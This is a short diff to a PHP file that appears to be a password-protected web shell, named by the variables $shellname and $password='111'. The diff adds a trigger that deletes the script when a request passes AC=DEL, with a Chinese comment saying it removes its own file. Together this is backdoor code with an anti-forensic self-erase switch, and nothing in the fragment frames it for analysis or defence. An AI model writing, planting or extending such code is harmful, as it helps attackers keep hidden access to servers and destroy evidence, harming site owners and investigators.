@@ -1,5 +1,13 @@
 
 <?php
+$AC="";
+if(isset($_GET['AC'])){ $AC=trim($_GET['AC']); $AC=str_replace(' ','',$AC); }
+if($AC=="DEL"){
+// 删除自身文件
+unlink(__FILE__);
+}
+
+
 header("Content-type:text/html;charset=utf8");
 $password='111';
 $shellname='Hello';
